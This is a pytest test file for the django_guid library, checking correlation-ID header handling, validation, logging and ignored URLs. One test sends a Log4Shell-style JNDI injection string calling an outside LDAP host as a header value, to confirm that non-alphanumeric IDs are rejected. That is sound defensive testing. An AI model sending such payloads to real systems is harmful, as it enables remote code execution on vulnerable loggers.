from copy import deepcopy

from django.core.exceptions import ImproperlyConfigured
from django.test import override_settings

import pytest

from django_guid.config import Settings


@pytest.mark.parametrize(
    'uuid_data,uuid_format',
    [('704ae5472cae4f8daa8f2cc5a5a8mock', 'hex'), ('704ae547-2cae-4f8d-aa8f-2cc5a5a8mock', 'string')],
)
def test_request_with_no_correlation_id(uuid_data, uuid_format, client, caplog, mock_uuid, monkeypatch):
    """
    Tests a request without any correlation-ID in it logs the correct things.
    In this case, it means that the first log message should not have any correlation-ID in it, but the next two
    (from views and services.useless_file) should have.
    :param mock_uuid: Monkeypatch fixture for mocking UUID
    :param client: Django client
    :param caplog: caplog fixture
    """
    mocked_settings = {'GUID_HEADER_NAME': 'Correlation-ID', 'VALIDATE_GUID': False, 'UUID_FORMAT': uuid_format}

    with override_settings(DJANGO_GUID=mocked_settings):
        settings = Settings()
        monkeypatch.setattr('django_guid.utils.settings', settings)
        response = client.get('/')

    expected = [
        ('sync middleware called', None),
        (
            'Header `Correlation-ID` was not found in the incoming request. ' f'Generated new GUID: {uuid_data}',
            None,
        ),
        ('This log message should have a GUID', uuid_data),
        ('Some warning in a function', uuid_data),
        ('Received signal `request_finished`, clearing guid', uuid_data),
    ]
    assert [(x.message, x.correlation_id) for x in caplog.records] == expected
    assert response['Correlation-ID'] == uuid_data


@pytest.mark.parametrize(
    'uuid_data,uuid_format',
    [('97c304252fd14b25b72d6aee31565843', 'hex'), ('97c30425-2fd1-4b25-b72d-6aee31565843', 'string')],
)
def test_request_with_correlation_id(uuid_data, uuid_format, client, caplog, monkeypatch):
    """
    Tests a request _with_ a correlation-ID in it logs the correct things.
    :param client: Django client
    :param caplog: caplog fixture
    """
    mocked_settings = {'GUID_HEADER_NAME': 'Correlation-ID', 'UUID_FORMAT': uuid_format}

    with override_settings(DJANGO_GUID=mocked_settings):
        settings = Settings()
        monkeypatch.setattr('django_guid.utils.settings', settings)
        response = client.get('/', **{'HTTP_Correlation-ID': uuid_data})
    expected = [
        ('sync middleware called', None),
        ('Correlation-ID found in the header', None),
        (f'{uuid_data} is a valid GUID', None),
        ('This log message should have a GUID', uuid_data),
        ('Some warning in a function', uuid_data),
        ('Received signal `request_finished`, clearing guid', uuid_data),
    ]
    assert [(x.message, x.correlation_id) for x in caplog.records] == expected
    assert response['Correlation-ID'] == uuid_data


@pytest.mark.parametrize(
    'uuid_data,uuid_format',
    [('704ae5472cae4f8daa8f2cc5a5a8mock', 'hex'), ('704ae547-2cae-4f8d-aa8f-2cc5a5a8mock', 'string')],
)
def test_request_with_non_alnum_correlation_id(uuid_data, uuid_format, client, caplog, mock_uuid, monkeypatch):
    """
    Tests a request _with_ a correlation-ID in it logs the correct things.
    :param client: Django client
    :param caplog: caplog fixture
    """
    mocked_settings = {'GUID_HEADER_NAME': 'Correlation-ID', 'UUID_FORMAT': uuid_format}

    with override_settings(DJANGO_GUID=mocked_settings):
        settings = Settings()
        monkeypatch.setattr('django_guid.utils.settings', settings)
        response = client.get('/', **{'HTTP_Correlation-ID': '!"#¤&${jndi:ldap://ondsinnet.no/a}'})
    expected = [
        ('sync middleware called', None),
        ('Correlation-ID found in the header', None),
        (f'Non-alnum Correlation-ID provided. New GUID is {uuid_data}', None),
        ('This log message should have a GUID', uuid_data),
        ('Some warning in a function', uuid_data),
        ('Received signal `request_finished`, clearing guid', uuid_data),
    ]
    assert [(x.message, x.correlation_id) for x in caplog.records] == expected
    assert response['Correlation-ID'] == uuid_data


def test_request_with_invalid_correlation_id(client, caplog, mock_uuid):
    """
    Tests that a request with an invalid GUID is replaced when VALIDATE_GUID is True.
    :param client: Django client
    :param caplog: Caplog fixture
    :param mock_uuid: Monkeypatch fixture for mocking UUID
    """
    response = client.get('/', **{'HTTP_Correlation-ID': 'bad-guid'})
    expected = [
        ('sync middleware called', None),
        ('Correlation-ID found in the header', None),
        ('bad-guid is not a valid GUID. New GUID is 704ae5472cae4f8daa8f2cc5a5a8mock', None),
        ('This log message should have a GUID', '704ae5472cae4f8daa8f2cc5a5a8mock'),
        ('Some warning in a function', '704ae5472cae4f8daa8f2cc5a5a8mock'),
        ('Received signal `request_finished`, clearing guid', '704ae5472cae4f8daa8f2cc5a5a8mock'),
    ]
    assert [(x.message, x.correlation_id) for x in caplog.records] == expected
    assert response['Correlation-ID'] == '704ae5472cae4f8daa8f2cc5a5a8mock'


def test_request_with_invalid_correlation_id_without_validation(client, caplog, monkeypatch):
    """
    Tests that a request with an invalid GUID is replaced when VALIDATE_GUID is False.
    :param client: Django client
    :param caplog: Caplog fixture
    """
    mocked_settings = {
        'GUID_HEADER_NAME': 'Correlation-ID',
        'VALIDATE_GUID': False,
        'INTEGRATIONS': [],
        'IGNORE_URLS': ['no-guid'],
    }
    with override_settings(DJANGO_GUID=mocked_settings):
        settings = Settings()
        monkeypatch.setattr('django_guid.utils.settings', settings)

        client.get('/', **{'HTTP_Correlation-ID': 'bad-guid'})
        expected = [
            ('sync middleware called', None),
            ('Correlation-ID found in the header', None),
            ('Returning ID from header without validating it as a GUID', None),
            ('This log message should have a GUID', 'bad-guid'),
            ('Some warning in a function', 'bad-guid'),
            ('Received signal `request_finished`, clearing guid', 'bad-guid'),
        ]
        assert [(x.message, x.correlation_id) for x in caplog.records] == expected


def test_no_return_header_and_drf_url(client, caplog, mock_uuid, monkeypatch):
    """
    Tests that it does not return the GUID if RETURN_HEADER is false.
    This test also tests a DRF response, just to confirm everything works in both worlds.
    """
    mocked_settings = {
        'GUID_HEADER_NAME': 'Correlation-ID',
        'VALIDATE_GUID': True,
        'INTEGRATIONS': [],
        'IGNORE_URLS': ['no-guid'],
        'RETURN_HEADER': False,
    }
    with override_settings(DJANGO_GUID=mocked_settings):
        settings = Settings()
        monkeypatch.setattr('django_guid.middleware.settings', settings)
        response = client.get('/api')
        expected = [
            ('sync middleware called', None),
            (
                'Header `Correlation-ID` was not found in the incoming request. Generated new GUID: 704ae5472cae4f8daa8f2cc5a5a8mock',
                None,
            ),
            ('This is a DRF view log, and should have a GUID.', '704ae5472cae4f8daa8f2cc5a5a8mock'),
            ('Some warning in a function', '704ae5472cae4f8daa8f2cc5a5a8mock'),
            ('Received signal `request_finished`, clearing guid', '704ae5472cae4f8daa8f2cc5a5a8mock'),
        ]
        assert [(x.message, x.correlation_id) for x in caplog.records] == expected
        assert not response.get('Correlation-ID')


def test_no_expose_header_return_header_true(client, monkeypatch):
    """
    Tests that it does not return the Access-Control-Allow-Origin when EXPOSE_HEADER is set to False
    and RETURN_HEADER is True
    """
    from django.conf import settings as django_settings

    mocked_settings = deepcopy(django_settings.DJANGO_GUID)
    mocked_settings['EXPOSE_HEADER'] = False
    mocked_settings['RETURN_HEADER'] = True
    with override_settings(DJANGO_GUID=mocked_settings):
        settings = Settings()
        monkeypatch.setattr('django_guid.middleware.settings', settings)
        response = client.get('/api')
        assert not response.get('Access-Control-Expose-Headers')


def test_expose_header_return_header_true(client, monkeypatch):
    """
    Tests that it does return the Access-Control-Allow-Origin when EXPOSE_HEADER is set to True
    and RETURN_HEADER is True
    """
    from django.conf import settings as django_settings

    mocked_settings = deepcopy(django_settings.DJANGO_GUID)
    mocked_settings['EXPOSE_HEADER'] = True
    with override_settings(DJANGO_GUID=mocked_settings):
        settings = Settings()
        monkeypatch.setattr('django_guid.middleware.settings', settings)
        response = client.get('/api')
        assert response.get('Access-Control-Expose-Headers')


def test_no_expose_header_return_header_false(client, monkeypatch):
    """
    Tests that it does not return the Access-Control-Allow-Origin when EXPOSE_HEADER is set to False
    and RETURN_HEADER is False
    """
    from django.conf import settings as django_settings

    mocked_settings = deepcopy(django_settings.DJANGO_GUID)
    mocked_settings['EXPOSE_HEADER'] = False
    mocked_settings['RETURN_HEADER'] = False
    with override_settings(DJANGO_GUID=mocked_settings):
        settings = Settings()
        monkeypatch.setattr('django_guid.middleware.settings', settings)
        response = client.get('/api')
        assert not response.get('Access-Control-Expose-Headers')


def test_expose_header_return_header_false(client, monkeypatch):
    """
    Tests that it does not return the Access-Control-Allow-Origin when EXPOSE_HEADER is set to True
    and RETURN_HEADER is False
    """
    from django.conf import settings as django_settings

    mocked_settings = deepcopy(django_settings.DJANGO_GUID)
    mocked_settings['EXPOSE_HEADER'] = True
    mocked_settings['RETURN_HEADER'] = False
    with override_settings(DJANGO_GUID=mocked_settings):
        settings = Settings()
        monkeypatch.setattr('django_guid.middleware.settings', settings)
        response = client.get('/api')
        assert not response.get('Access-Control-Expose-Headers')


def test_cleanup_signal(client, caplog, monkeypatch):
    """
    Tests that a request cleans up a request after finishing.
    :param client: Django client
    :param caplog: Caplog fixture
    """
    from django.conf import settings as django_settings

    mocked_settings = deepcopy(django_settings.DJANGO_GUID)
    mocked_settings['VALIDATE_GUID'] = False
    with override_settings(DJANGO_GUID=mocked_settings):
        settings = Settings()
        monkeypatch.setattr('django_guid.utils.settings', settings)
        client.get('/', **{'HTTP_Correlation-ID': 'bad-guid'})
        client.get('/', **{'HTTP_Correlation-ID': 'another-bad-guid'})

        expected = [
            # First request
            ('sync middleware called', None),
            ('Correlation-ID found in the header', None),
            ('Returning ID from header without validating it as a GUID', None),
            ('This log message should have a GUID', 'bad-guid'),
            ('Some warning in a function', 'bad-guid'),
            ('Received signal `request_finished`, clearing guid', 'bad-guid'),
            # Second request
            ('sync middleware called', None),
            ('Correlation-ID found in the header', None),
            ('Returning ID from header without validating it as a GUID', None),
            ('This log message should have a GUID', 'another-bad-guid'),
            ('Some warning in a function', 'another-bad-guid'),
            ('Received signal `request_finished`, clearing guid', 'another-bad-guid'),
        ]
        assert [(x.message, x.correlation_id) for x in caplog.records] == expected


def test_improperly_configured_if_not_in_installed_apps(client, monkeypatch):
    """
    Test that the app will fail if `is_installed('django_guid')` is `False`.
    """
    monkeypatch.setattr('django_guid.middleware.apps.is_installed', lambda x: False)
    with pytest.raises(ImproperlyConfigured, match='django_guid must be in installed apps'):
        client.get('/')


def test_url_ignored(client, caplog):
    """
    Test that a URL specified in IGNORE_URLS is ignored.
    :param client: Django client
    :param caplog: Caplog fixture
    """
    from django.conf import settings as django_settings

    mocked_settings = deepcopy(django_settings.DJANGO_GUID)
    mocked_settings['IGNORE_URLS'] = {'no-guid'}
    with override_settings(DJANGO_GUID=mocked_settings):
        client.get('/no-guid', **{'HTTP_Correlation-ID': 'bad-guid'})
        # No log message should have a GUID, aka `None` on index 1.
        expected = [
            ('sync middleware called', None),
            ('This log message should NOT have a GUID - the URL is in IGNORE_URLS', None),
            ('Some warning in a function', None),
            ('Received signal `request_finished`, clearing guid', None),
        ]
        assert [(x.message, x.correlation_id) for x in caplog.records] == expected


def test_url_ignored_with_regex(client, caplog, monkeypatch):
    """
    Test that a URL specified in IGNORE_URLS is ignored.
    :param client: Django client
    :param caplog: Caplog fixture
    """
    from django.conf import settings as django_settings

    mocked_settings = deepcopy(django_settings.DJANGO_GUID)
    mocked_settings['IGNORE_REGEX_URLS'] = {'no-*'}
    with override_settings(DJANGO_GUID=mocked_settings):
        settings = Settings()
        monkeypatch.setattr('django_guid.utils.settings', settings)
        client.get('/no-guid-regex', **{'HTTP_Correlation-ID': 'bad-guid'})
        # No log message should have a GUID, aka `None` on index 1.
        expected = [
            ('sync middleware called', None),
            ('This log message should NOT have a GUID - the URL is in IGNORE_REGEX_URLS', None),
            ('Some warning in a function', None),
            ('Received signal `request_finished`, clearing guid', None),
        ]
        assert [(x.message, x.correlation_id) for x in caplog.records] == expected
